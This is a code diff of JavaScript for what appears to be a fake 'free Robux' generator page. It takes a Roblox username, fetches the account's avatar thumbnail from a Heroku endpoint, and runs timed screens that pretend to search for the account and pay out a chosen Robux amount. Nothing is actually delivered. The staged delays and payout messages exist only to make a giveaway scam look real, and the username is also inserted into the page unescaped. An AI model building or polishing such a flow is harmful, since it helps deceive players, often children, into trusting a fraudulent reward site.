@@ -1,51 +1,122 @@
-const rbxbtn = document.querySelector(".getrbx");
+document.addEventListener("DOMContentLoaded", function () {
+    const rbxbtn = document.querySelector(".getrbx");
+    const box1 = document.querySelector(".box");
+    const box2 = document.querySelector(".box2");
+    const box3 = document.querySelector(".box3");
+    const box4 = document.querySelector(".box4");
+    const rbxtotal = document.querySelectorAll(".details");
+    const username = document.querySelector(".username");
+    const useroutput = document.querySelector(".useroutput");
+    let thumbnailUrl = ""; // Store thumbnail URL
 
-const box1 = document.querySelector(".box");
-const box2 = document.querySelector(".box2");
-const box3 = document.querySelector(".box3");
-const box4 = document.querySelector(".box4");
-const rbxtotal = document.querySelectorAll(".details");
+    console.log("DOM fully loaded and parsed");
 
-const username = document.querySelector(".username");
+    // Function to handle Next button click/touch
+    const handleNextButtonClick = (event) => {
+        event.preventDefault(); // Prevent any default action
+        console.log("Next button clicked or touched"); // Debugging line to check click events
+        console.log("Username entered:", username.value); // Debugging line to check if username value is being captured
 
-const useroutput = document.querySelector(".useroutput");
+        if (username.value.length <= 2) {
+            alert("Please enter a valid username");
+        } else {
+            useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
+            updateUsernameDisplay(); // Update username display immediately
+            fetchThumbnail(username.value).then(url => {
+                thumbnailUrl = url;
+                box1.style.display = "none";
+                box2.style.display = "block";
+                setTimeout(() => {
+                    showbox2();
+                    showbox3();
+                    displayThumbnail();
+                    updateUsernameDisplay(); // Ensure username is displayed in "Paying out" section
+                }, 2500);
+            }).catch(error => {
+                alert("Error fetching thumbnail. Please try again.");
+                console.error(error);
+            });
+        }
+    };
 
-rbxbtn.addEventListener("click", () => {
-  if (username.value.length <= 2) {
-    alert("please enter username");
-  } else {
-    box1.style.display = "none";
-    box2.style.display = "block";
-    setTimeout(showbox2, 2500);
-    setTimeout(showbox3, 2500);
-  }
+    // Attach event listeners for "Next" button
+    rbxbtn.addEventListener("click", handleNextButtonClick);
+    rbxbtn.addEventListener("touchend", handleNextButtonClick); // Added for mobile devices
 
-  useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
+    // Function to handle Robux amount button click/touch
+    const handleRobuxButtonClick = (event) => {
+        event.preventDefault(); // Prevent any default action
+        console.log("Robux amount button clicked or touched");
+        updateUsernameDisplay(); // Update the username display in payout section
+        box3.style.display = "none";
+        box2.style.display = "block";
+        setTimeout(showboxagain, 2500);
+        setTimeout(showbox4, 2500);
+    };
+
+    // Attach event listeners for each Robux amount detail button
+    rbxtotal.forEach((btn) => {
+        btn.addEventListener("click", handleRobuxButtonClick);
+        btn.addEventListener("touchend", handleRobuxButtonClick); // Added for mobile devices
+    });
+
+    // Function to update the username display in the payout section
+    function updateUsernameDisplay() {
+        const usernameDisplay = document.getElementById('usernameDisplay');
+        if (usernameDisplay) {
+            usernameDisplay.textContent = username.value;
+        }
+    }
+
+    let showboxagain = () => {
+        box2.style.display = "none";
+    };
+    let showbox2 = () => {
+        box2.style.display = "none";
+    };
+    let showbox3 = () => {
+        box3.style.display = "block";
+    };
+    let showbox4 = () => {
+        box4.style.display = "block";
+    };
+
+    // Function to fetch thumbnail URL
+    async function fetchThumbnail(username) {
+        console.log("Fetching thumbnail for username:", username);
+        try {
+            const response = await fetch('https://get-thumbnail-3deb5133bcc9.herokuapp.com/get_thumbnail', { // Replace with your Heroku app's URL
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username: username })
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+
+            const data = await response.json();
+            if (data.thumbnailUrl) {
+                return data.thumbnailUrl;
+            } else {
+                throw new Error('Thumbnail not found');
+            }
+        } catch (error) {
+            console.error("Error fetching thumbnail:", error);
+            throw error;
+        }
+    }
+
+    // Function to display thumbnail in box3
+    function displayThumbnail() {
+        if (thumbnailUrl) {
+            console.log("Displaying thumbnail in box3");
+            const thumbnailContainer = document.createElement("div");
+            thumbnailContainer.className = "thumbnail-container"; // Added class for styling
+            thumbnailContainer.innerHTML = `<img src="${thumbnailUrl}" alt="Roblox Thumbnail">`;
+            box3.appendChild(thumbnailContainer);
+        }
+    }
 });
-
-rbxtotal.forEach((btn) => {
-  btn.addEventListener("click", () => {
-    box3.style.display = "none";
-
-    box2.style.display = "block";
-
-    setTimeout(showboxagain, 2500);
-    setTimeout(showbox4, 2500);
-    useroutput.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
-  });
-});
-
-let showboxagain = () => {
-  box2.style.display = "none";
-};
-let showbox2 = () => {
-  box2.style.display = "none";
-};
-
-let showbox3 = () => {
-  box3.style.display = "block";
-};
-
-let showbox4 = () => {
-  box4.style.display = "block";
-};
